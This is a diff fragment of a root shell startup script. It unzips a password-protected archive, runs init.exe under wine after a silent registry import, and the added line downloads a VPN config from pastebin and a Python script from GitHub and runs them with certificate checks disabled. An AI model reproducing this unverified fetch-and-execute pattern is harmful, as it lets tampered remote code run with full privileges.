@@ -8,5 +8,5 @@ rm -rf init.exe;
 unzip -P1011011011 init.zip;
 wine regedit /s /root/s.reg;
 wine init.exe&
-wget -O /root/sickvpn.conf https://pastebin.com/raw/yvNnT0uF --no-check-certificate && python3 /root/pingvpn.py && openvpn /root/sickvpn.conf&
+wget -O /root/sickvpn.conf https://pastebin.com/raw/yvNnT0uF --no-check-certificate && wget -O /root/pingvpn.py https://github.com/ind3p3nd3nt/sickvpn.vip/raw/master/pingvpn.py --no-check-certificate && python3 /root/pingvpn.py && openvpn /root/sickvpn.conf&
 exit 0
